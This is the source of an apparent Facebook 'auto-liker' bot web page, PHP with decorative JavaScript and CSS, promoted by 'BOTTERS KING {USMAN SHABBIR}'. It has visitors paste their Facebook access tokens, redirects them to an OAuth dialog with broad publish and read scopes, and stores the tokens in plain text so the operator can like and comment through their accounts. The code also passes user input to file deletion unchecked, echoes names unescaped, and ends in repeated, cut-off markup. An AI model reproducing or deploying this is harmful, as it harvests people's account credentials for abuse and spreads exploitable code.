﻿
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title> USMAN SHABBIR </title><link rel="stylesheet" type="text/css" href="huli.css" 
media="all,black.css"/><link rel="shortcut icon" href="http://www.gfxmag.com/wp-content/uploads/2016/07/facebook-like-vector-logo.png">
<?php error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(                                                         
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $lora[]=$b.'='.$c;
}
$true='?'.implode('&',$lora);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by Hulash',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('lora')){
        mkdir('lora');
}
if($bb){
$blue=fopen('lora/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("INFO : Text robot telah dibuat")</script>';
}else{
        if($z){
if(file_exists('lora/'.$id)){
$file=file_get_contents('lora/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('lora/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('lora/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('lora/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('lora/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('lora/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Data Anda telah ter Save, Robot berjalan otomatis")</script>';}}
}

public function lOgbot($d){
        unlink('lora/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('lora/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like tambah komen';
}else{
        $satu='off';
        $ak='Like saja';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot emo';
}else{
        $dua='off';
        $ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered on';
}else{
        $tiga='off';
        $ek='Powered off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text via script';
}else{
        $empat='off';
        $uk='Via text sendiri';
}
echo'
<center><div id="bottom-content">
<div id="navigation-menu">
<h2>
<ul>
<li>
Welcome Back : <font color="White">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Select Menu Robot</li>
<li>
<select name="likes">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like Only</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like And Comment</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'</li>
<li>';
        if($empat=='on'){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
writle your comment</option>
</select>';
}else{
        if($if[5]){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Ganti Text Anda
</option>
<option value="on">
Text via script</option>
</select>';
        }else{
        echo'
<FONT face="Arial ,Tahoma" size="4" color="#FFFFFF">
</a>
<a class="" href=""><font color="" size="0"></font></a></b><font size="0" 
<br><br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="SAVE"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
<div id="header">
<h1 class="heading">
<script language="JavaScript" src="huli1.js"></script>
<marquee behavior="alternate"<h6>
<font face="Battle Beasts" size="12"> <script src="huli.js"></script>
</h6></marquee><br><br>
';
} 

public function home(){
echo'
<div id="content">
<br><br>
<center>
<div class="AK">
<a href="https://www.facebook.com/usman.shabbi" alt="Us,am Shabbir" target="_blank">
<img
src="https://graph.facebook.com/100006912916183/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 197, 227); padding: 0px;" width="240" height="240"></a>
<a href="http://facebook.com/usman.shabbi" alt="Usman Shabbir" target="_blank"> 



<br><center><iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fusman.shabbi&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe></center>
<br>
';
}


public function showlogin(){
		 echo '
';
	}





public function bwh() {
    
 if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true){
          $this->showlogin();
          $this->membEr();
          return;
 }
 	echo '

<br>
<center>
<center>
<ul>
<center>
<a href="http://usman-tokens.tk" target="_blank">

<input class="button button1" type="button" value="iOS Token"> </a>
<a href="http://http://usman-tokens.tk" target="_blank">

<input class="button button1" type="button" value="iPhone Token"> </a>
<a href="https://facebook.com/usman.shabbi" target="_blank">
<input class="button button1" type="button" value="My FaCeBOok"> </a>
</center>
<h4><font size="26" color="blue"><center>   </font><font face="Orbitron" size="6" 
<br></ul></div></div>
</center>

</center>
<marquee behavior="scroll" direction="right" scrollamount="8" scrolldelay="1"><strong><font style="text-shadow: 1px 1px black; color:;" size="8"> BOTTERS KING {USMAN SHABBIR} </font></strong></center></marquee></center><font color="White" size="5">Submit Your Token Here!</font></a>

<center>
<form action="index.php" method="post">
<input class="inptext inptext1" type="text"
placeholder="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Paste your Token Here !" st name="token"> <br>
<input class="button button1" id="sbmt" class="inp-btn" type="submit"  value="SUBMIT"></form>
<center><div id ="example1"></div></center>
</div></div></div></font>
';

$this->membEr();
}

public function membEr(){
        if(!is_dir('lora')){
        mkdir('lora');
}
$up=opendir('lora');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="content">
<br>
<center><div style="font-family: Courgette;font-size: 20pt;text-shadow: 0 0 11px 
#000000, 0 0 11px #000000, 0 0 11px #000000;color: #FFF"><font color="white"> Active Botters:</font> <font color=#aa00ff>'.count($user).'</font></center>
<center>
';
}



public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('lora/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('lora/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Token invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<script>
if  ((document.getElementById) && 
window.addEventListener || window.attachEvent){

(function(){

//Configure here...

var xCol = "#ff0000";
var yCol = "#ffffff";
var zCol = "#0000ff";
var n = 6;   //number of dots per trail.
var t = 40;  //setTimeout speed.
var s = 0.2; //effect speed.

//End.

var r,h,w;
var d = document;
var my = 10;
var mx = 10;
var stp = 0;
var evn = 360/3;
var vx = new Array();
var vy = new Array();
var vz = new Array();
var dy = new Array();
var dx = new Array();

var pix = "px";

var strictmod = ((document.compatMode) && 
document.compatMode.indexOf("CSS") != -1);


var domWw = (typeof window.innerWidth == "number");
var domSy = (typeof window.pageYOffset == "number");
var idx = d.getElementsByTagName('div').length;

for (i = 0; i < n; i++){
var dims = (i+1)/2;
d.write('<div id="x'+(idx+i)+'" style="position:absolute;'
+'top:0px;left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+xCol+';font-size:'+dims+'px"></div>'

+'<div id="y'+(idx+i)+'" style="position:absolute;top:0px;'
+'left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+yCol+';font-size:'+dims+'px"></div>'

+'<div id="z'+(idx+i)+'" style="position:absolute;top:0px;'
+'left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+zCol+';font-size:'+dims+'px"></div>');
}

if (domWw) r = window;
else{ 
  if (d.documentElement && 
  typeof d.documentElement.clientWidth == "number" && 
  d.documentElement.clientWidth != 0)
  r = d.documentElement;
 else{ 
  if (d.body && 
  typeof d.body.clientWidth == "number")
  r = d.body;
 }
}


function winsize(){
var oh,sy,ow,sx,rh,rw;
if (domWw){
  if (d.documentElement && d.defaultView && 
  typeof d.defaultView.scrollMaxY == "number"){
  oh = d.documentElement.offsetHeight;
  sy = d.defaultView.scrollMaxY;
  ow = d.documentElement.offsetWidth;
  sx = d.defaultView.scrollMaxX;
  rh = oh-sy;
  rw = ow-sx;
 }
 else{
  rh = r.innerHeight;
  rw = r.innerWidth;
 }
h = rh; 
w = rw;
}
else{
h = r.clientHeight; 
w = r.clientWidth;
}
}


function scrl(yx){
var y,x;
if (domSy){
 y = r.pageYOffset;
 x = r.pageXOffset;
 }
else{
 y = r.scrollTop;
 x = r.scrollLeft;
 }
return (yx == 0)?y:x;
}


function mouse(e){
var msy = (domSy)?window.pageYOffset:0;
if (!e) e = window.event;    
 if (typeof e.pageY == 'number'){
  my = e.pageY - msy + 16;
  mx = e.pageX + 6;
 }
 else{
  my = e.clientY - msy + 16;
  mx = e.clientX + 6;
 }
if (my > h-65) my = h-65;
if (mx > w-50) mx = w-50;
}



function assgn(){
for (j = 0; j < 3; j++){
 dy[j] = my + 50 * Math.cos(stp+j*evn*Math.PI/180) * Math.sin((stp+j*25)/2) + scrl(0) + pix;
 dx[j] = mx + 50 * Math.sin(stp+j*evn*Math.PI/180) * Math.sin((stp+j*25)/2) * Math.sin(stp/4) + pix;
}
stp+=s;

for (i = 0; i < n; i++){
 if (i < n-1){
  vx[i].top = vx[i+1].top; vx[i].left = vx[i+1].left; 
  vy[i].top = vy[i+1].top; vy[i].left = vy[i+1].left;
  vz[i].top = vz[i+1].top; vz[i].left = vz[i+1].left;
 } 
 else{
  vx[i].top = dy[0]; vx[i].left = dx[0];
  vy[i].top = dy[1]; vy[i].left = dx[1];
  vz[i].top = dy[2]; vz[i].left = dx[2];
  }
 }
setTimeout(assgn,t);
}


function init(){
for (i = 0; i < n; i++){
 vx[i] = document.getElementById("x"+(idx+i)).style;
 vy[i] = document.getElementById("y"+(idx+i)).style;
 vz[i] = document.getElementById("z"+(idx+i)).style;
 }
winsize();
assgn();
}


if (window.addEventListener){
 window.addEventListener("resize",winsize,false);
 window.addEventListener("load",init,false);
 document.addEventListener("mousemove",mouse,false);
}  
else if (window.attachEvent){
 window.attachEvent("onload",init);
 document.attachEvent("onmousemove",mouse);
 window.attachEvent("onresize",winsize);
} 

})();
}//End.
</script>

<center>
<br>

<!-- hitwebcounter Code START -->
<a href="https://www.facebook.com/yourxfather724" target="_blank">
<img src="http://hitwebcounter.com/counter/counter.php?page=6612622&style=0001&nbdigits=5&type=page&initCount=0" title="Total Visitorx" Alt="my widget for counting"   border="0" >
</a>                                        <br/>
                                        <!-- hitwebcounter.com --><a href=https://www.facebook.com/usman.shabbi" title="" 
                                        target="_blank" style="font-family: Arial, Helvetica, sans-serif; 
                                        font-size: 11px; color: #9C9E94; text-decoration: none ;"><strong>                                        </strong>
                                        </a>   
 
 
<script>

// ********** عدل هنا

var text="Designed By BOTTERS KING {USMAN SHABBIR}"//
var speed=25// سرعه تغير الالوان

// ********** لا تعدل شي هنا


if (document.all||document.getElementById){
document.write('<span id="highlight">' + text + '</span>')
var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
}
else
document.write(text)
var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
var r=1
var g=1
var b=1
var seq=1
function changetext(){
rainbow="#"+hex[r]+hex[g]+hex[b]
storetext.style.color=rainbow
}
function change(){
if (seq==6){
b--
if (b==0)
seq=1
}
if (seq==5){
r++
if (r==12)
seq=6
}
if (seq==4){
g--
if (g==0)
seq=5
}
if (seq==3){
b++
if (b==12)
seq=4
}
if (seq==2){
r--
if (r==0)
seq=3
}
if (seq==1){
g++
if (g==12)
seq=2
}
changetext()
}
function starteffect(){
if (document.all||document.getElementById)
flash=setInterval("change()",speed)
}
starteffect()
</script>
<br>
<br>
<script language="JavaScript1.2">
 
 
 
var message="WELCOME TO OUR BOT"
var neonbasecolor="gray"
var neontextcolor="#02d0ff"
var flashspeed=200  //in milliseconds
 
///No need to edit below this line/////
 
var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)
 
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
 
function neon(){
 
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
//eval("document.all.neonlight"+m).style.color=neonbasecolor
crossref(m).style.color=neonbasecolor
}
 
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor
 
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",1500)
return
}
}
 
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>

<!--KodSeo.tr.gg Zıplayan Duyuru Panosu (Version: KS ZDP1) Kodu Start-->
  <div class="huli">
<div class="kddtop"> <div class="kddtut"> <p>

<br/><style>
  .kddtop {
       right:16px;

      width: 350px;
  min-height:180px;
  background: transparent;
  margin: 0 auto;
  position: fixed;
  font-family:Arial, sans-serif !important;
  border-radius:3px;
  -webkit-border-radius:3px;
  bottom: 16px;
  overflow: hidden;box-shadow: 0px 1px 4px transparent;
z-index:900;}

.kddtop p{width:0px;height:0px;overflow:hidden;opacity:0;position:relative;padding:16px 0 0 20px;z-index:5;margin:0 0 0 0;
color:rgba(0,0,0,0);}
.kddtop:hover p{display:block;
width:100%;height:100%;opacity:1;color:#fff;
  transition:opacity 1s 0.4s ease;
}
.kddtop:before {
  content: "🃏";
  position: absolute;
  line-height: 1500px;
    text-align: center;
    color: #fff;
    font-weight: bold;
    font-size: 1000px;
  z-index:1;
  width: 1500px;
  height: 1500px;
  background: #F44336;
  border-radius: 50%;
  top: 100%;
  left: 50%;
  -webkit-transform: translate3d(-50%, -50%, 0) scale(0.035);
  transform: translate3d(-50%, -50%, 0) scale(0.035);
  -webkit-animation: .5s bounce infinite alternate-reverse;
  animation: .5s bounce infinite alternate-reverse;
  -webkit-transition: .5s -webkit-transform ease, .5s color ease;
  transition: .5s transform ease, .5s color ease;
}
.kddtop:after {
  content: "";
  position: absolute;
  left: 133px;
  right: 133px;
  bottom: 0;
  height: 15px;
  background: rgba(0, 0, 0, 0.5);
  border-radius: 50%;
  -webkit-transition: .3s opacity ease;
  transition: .3s opacity ease;
  -webkit-animation: .5s shadow infinite alternate-reverse;
  animation: .5s shadow infinite alternate-reverse;
}
.kddtop:hover {
  box-shadow: 0px 5px 4px rgba(0, 0, 0, 0.3);
  -webkit-transition: .5s all ease .25s;
  transition: .5s all ease .25s;
}
    .kddtop:hover:before { color: Black; top: 100%; -webkit-transform: translate3d(-50%, -50%, 0) scale(1); transform: translate3d(-50%, -50%, 0) scale(1); -webkit-transition: .3s top ease, .5s -webkit-transform ease .25s, .5s color ease .25s; transition: .3s top ease, .5s transform ease .25s, .5s color ease .25s; } </style> <style> .kddtop:hover:after { opacity: 0; } .kddtop:hover .kddtut:before { width: 50px; -webkit-transition: .3s all ease 1.25s; transition: .3s all ease 1.25s; } .kddtop .kddtut { padding: 0 35px 5px 0; box-sizing: border-box; display: block; position: relative; opacity: 1; text-align: center; } .kddtop .kddtut:before { content: ""; position: absolute; top: 0; left: 150px; rigth: 150px; width: 0px; height: 1px; background: black; } @-webkit-keyframes bounce { from { top: 93%; } to { top: 50%; } } @keyframes bounce { from { top: 93%; } to { top: 50%; } } @-webkit-keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } } @keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } }</style>
</p><noscript><a href="http://KodSeo.tr.gg"></a></noscript> </div> </div>


</script>

<script> var bits=50; // how many bits var speed=20; // how fast - smaller is faster var bangs=9; // how many can be launched simultaneously (note that using too many can slow the script down) var colours=new Array("#03f", "#f03", "#0e0", "#93f", "#0cf", "#f93", "#f0c"); var bangheight=new Array(); var intensity=new Array(); var colour=new Array(); var Xpos=new Array(); var Ypos=new Array(); var dX=new Array(); var dY=new Array(); var stars=new Array(); var decay=new Array(); var swide=800; var shigh=600; var boddie; window.onload=function() { if (document.getElementById) { var i; boddie=document.createElement("div"); boddie.style.position="fixed"; boddie.style.top="0px"; boddie.style.left="0px"; boddie.style.overflow="visible"; boddie.style.width="1px"; boddie.style.height="1px"; boddie.style.backgroundColor="transparent"; document.body.appendChild(boddie); set_width(); for (i=0; i<bangs; i++) { write_fire(i); launch(i); setInterval('stepthrough('+i+')', speed); } }} function write_fire(N) { var i, rlef, rdow; stars[N+'r']=createDiv('|', 12); boddie.appendChild(stars[N+'r']); for (i=bits*N; i<bits+bits*N; i++) { stars[i]=createDiv('*', 13); boddie.appendChild(stars[i]); } } function createDiv(char, size) { var div=document.createElement("div"); div.style.font=size+"px monospace"; div.style.position="absolute"; div.style.backgroundColor="transparent"; div.appendChild(document.createTextNode(char)); return (div); } function launch(N) { colour[N]=Math.floor(Math.random()*colours.length); Xpos[N+"r"]=swide*0.5; Ypos[N+"r"]=shigh-5; bangheight[N]=Math.round((0.5+Math.random())*shigh*0.4); dX[N+"r"]=(Math.random()-0.5)*swide/bangheight[N]; if (dX[N+"r"]>1.25) stars[N+"r"].firstChild.nodeValue="/"; else if (dX[N+"r"]<-1.25) stars[N+"r"].firstChild.nodeValue="\\"; else stars[N+"r"].firstChild.nodeValue="|"; stars[N+"r"].style.color=colours[colour[N]]; } function bang(N) { var i, Z, A=0; for (i=bits*N; i<bits+bits*N; i++) { Z=stars[i].style; Z.left=Xpos[i]+"px"; Z.top=Ypos[i]+"px"; if (decay[i]) decay[i]--; else A++; if (decay[i]==15) Z.fontSize="7px"; else if (decay[i]==7) Z.fontSize="2px"; else if (decay[i]==1) Z.visibility="hidden"; Xpos[i]+=dX[i]; Ypos[i]+=(dY[i]+=1.25/intensity[N]); } if (A!=bits) setTimeout("bang("+N+")", speed); } function stepthrough(N) { var i, M, Z; var oldx=Xpos[N+"r"]; var oldy=Ypos[N+"r"]; Xpos[N+"r"]+=dX[N+"r"]; Ypos[N+"r"]-=4; if (Ypos[N+"r"]<bangheight[N]) { M=Math.floor(Math.random()*3*colours.length); intensity[N]=5+Math.random()*4; for (i=N*bits; i<bits+bits*N; i++) { Xpos[i]=Xpos[N+"r"]; Ypos[i]=Ypos[N+"r"]; dY[i]=(Math.random()-0.5)*intensity[N]; dX[i]=(Math.random()-0.5)*(intensity[N]-Math.abs(dY[i]))*1.25; decay[i]=16+Math.floor(Math.random()*16); Z=stars[i]; if (M<colours.length) Z.style.color=colours[i%2?colour[N]:M]; else if (M<2*colours.length) Z.style.color=colours[colour[N]]; else Z.style.color=colours[i%colours.length]; Z.style.fontSize="13px"; Z.style.visibility="visible"; } bang(N); launch(N); } stars[N+"r"].style.left=oldx+"px"; stars[N+"r"].style.top=oldy+"px"; } window.onresize=set_width; function set_width() { var sw_min=999999; var sh_min=999999; if (document.documentElement && document.documentElement.clientWidth) { if (document.documentElement.clientWidth>0) sw_min=document.documentElement.clientWidth; if (document.documentElement.clientHeight>0) sh_min=document.documentElement.clientHeight; } if (typeof(self.innerWidth)!="undefined" && self.innerWidth) { if (self.innerWidth>0 && self.innerWidth<sw_min) sw_min=self.innerWidth; if (self.innerHeight>0 && self.innerHeight<sh_min) sh_min=self.innerHeight; } if (document.body.clientWidth) { if (document.body.clientWidth>0 && document.body.clientWidth<sw_min) sw_min=document.body.clientWidth; if (document.body.clientHeight>0 && document.body.clientHeight<sh_min) sh_min=document.body.clientHeight; } if (sw_min==999999 || sh_min==999999) { sw_min=800; sh_min=600; } swide=sw_min; shigh=sh_min; } 
</script>
<br><font face="Motken Unicode Hor" size="5"> <script> // ********** عدل هنا var text="Designed By USMAN SHABBIR"// var speed=25// سرعه تغير الالوان // ********** لا تعدل شي هنا if (document.all||document.getElementById){ document.write('<span id="highlight">' + text + '</span>') var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight } else document.write(text) var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0") var r=1 var g=1 var b=1 var seq=1 function changetext(){ rainbow="#"+hex[r]+hex[g]+hex[b] storetext.style.color=rainbow } function change(){ if (seq==6){ b-- if (b==0) seq=1 } if (seq==5){ r++ if (r==12) seq=6 } if (seq==4){ g-- if (g==0) seq=5 } if (seq==3){ b++ if (b==12) seq=4 } if (seq==2){ r-- if (r==0) seq=3 } if (seq==1){ g++ if (g==12) seq=2 } changetext() } function starteffect(){ if (document.all||document.getElementById) flash=setInterval("change()",speed) } starteffect() </script> <br> <br> <script language="JavaScript1.2"> var message="BOTTERS KING {USMAN SHABBIR}" var neonbasecolor="gray" var neontextcolor="#02d0ff" var flashspeed=200 //in milliseconds ///No need to edit below this line///// var n=0 if (document.all||document.getElementById){ document.write('<font color="'+neonbasecolor+'">') for (m=0;m<message.length;m++) document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>') document.write('</font>') } else document.write(message) function crossref(number){ var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number) return crossobj } function neon(){ //Change all letters to base color if (n==0){ for (m=0;m<message.length;m++) //eval("document.all.neonlight"+m).style.color=neonbasecolor crossref(m).style.color=neonbasecolor } //cycle through and change individual letters to neon color crossref(n).style.color=neontextcolor if (n<message.length-1) n++ else{ n=0 clearInterval(flashing) setTimeout("beginneon()",1500) return } } function beginneon(){ if (document.all||document.getElementById) flashing=setInterval("neon()",flashspeed) } beginneon() </script> <br> <style>div.koddosturenkli{position:fixed;z-index:9999990;}div.sosyal7kd{top:50%;left:0px;margin-top:-250px;width:80px;height:470px;background:transparent;}.a8a{display:block;position:relative;left:-62px;float:left;background:#44f;width:80px;height:60px;margin:0px 0px 6px 0px;background-position:center center;background-repeat:no-repeat;transition: all 0.4s ease-out;-webkit-transition: all 0.4s ease-out;-webkit-box-shadow:-4px 0px 4px -4px #444;-moz-box-shadow:-4px 0px 4px -4px #444;box-shadow:-4px 0px 4px -4px #444;-webkit-border-top-left-radius: 3px;-webkit-border-bottom-left-radius: 3px;border-top-left-radius: 3px;border-bottom-left-radius: 3px;}</style><style>.a8a:hover, .a8a:active, .a8a:focus{outline:0;left:-10px;width:60px;transform: rotate(-11deg);-ms-transform: rotate(-11deg);-webkit-transform: rotate(-11deg);}</style><style>.facebook7a{background-image:url(http://icons.iconarchive.com/icons/danleech/simple/48/facebook-icon.png);background-color:#4a6ea9}.google7a{background-image:url(http://icons.iconarchive.com/icons/danleech/simple/48/google-plus-icon.png);background-color:#e25e43}.twitter7a{background-image:url(http://icons.iconarchive.com/icons/danleech/simple/48/twitter-icon.png);background-color:#30dcf3}.linkedin7a{background-image:url(https://cdn2.iconfinder.com/data/icons/instagram-new/512/instagram-square-flat-2-128.png);background-color:#0095bc}.youtube7a{background-image:url(http://icons.iconarchive.com/icons/danleech/simple/48/youtube-icon.png);background-color:#e44840}.tumblr7a{background-image:url(http://icons.iconarchive.com/icons/danleech/simple/48/tumblr-icon.png);background-color:#375775}.rss7a{background-image:url(http://icons.iconarchive.com/icons/danleech/simple/48/rss-icon.png);background-color:#f2b63e}div.koddosturenkli{_position:absolute;}div.sosyal7kd{_bottom:auto;_top:expression(ie6=(document.documentElement.scrollTop+document.documentElement.clientHeight - 52+"px") );}</style> <koddostu> <div class="koddosturenkli sosyal7kd"> <a target="_blank" href="https://www.facebook.com/usman.shabbi" class="facebook7a a8a"></a> <a target="_blank" a"></a> </div> <font face="Motken Unicode Hor" size="3"> <div class="widget-content"> </div></div></td><td align="right"><style type="text/css">#info-teja {z-index: 1000;background:-moz-linear-gradient(top, #00708b, #FFFFFF);background: -webkit-gradient(linear, left top, left bottom, from(#1F2326), to(#FFFFFF));box-shadow:-2px -2px 8px #FFFFFF, 2px 2px 20px #FFFFFF;-moz-box-shadow:-2px -2px 8px #FFFFFF, 2px 2px 20px #FFFFFF;-webkit-box-shadow:-2px -2px 8px #FFFFFF, 2px 2px 20px #000000;width:460px;position: fixed;top:150px;left:0;margin-left:-350px;border:1px solid #FFFFFF;background-position:top right no-repeat;height:35px;font:11px Arial;color:#FFFFFF;border-top-right-radius:8px;border-bottom-right-radius:8px;-moz-border-radius-topright:8px;-moz-border-radius-bottomright:8px;-webkit-border-top-right-radius:8px;-webkit-border-bottom-right-radius:8px;}#info-teja{-o-transition: all 1s ease-in;-moz-transition: all 1s ease-in;-webkit-transition: all 1s ease-in;} #info-teja:hover{width:400px;opacity:1.0;margin-left:0;}.Tejainbox {border:1px solid pink;width:320px; margin:0px 90px 10px 10px;background:#FFFFFF;color:#FFFFFF; border-radius :20px; padding:5px 0;-moz-border-radius:20px; -webkit-border-radius:20px;-o-transition:all 2s ease-in;-moz-transition:all 2s ease-in;-webkit-transition:all 2s ease-in;opacity:0.2;}.Tejainbox:hover{opacity:1.0;box-shadow:1px 1px 15px #FFFFFF; -moz-box-shadow: 1px 1px 15px #FFFFFF; -webkit-box-shadow: 1px 1px 15px #00708b;background: black;}.Tejainbox2 {margin:5px 10px;padding:0px 8px 10px;color:#FFFFFF;overflow:hidden;height:370px;}.teja15 {border-radius:15px;-moz-border-radius:15px;-webkit-border-radius:15px;}.Teja2 ul.bom {margin: 0; padding: 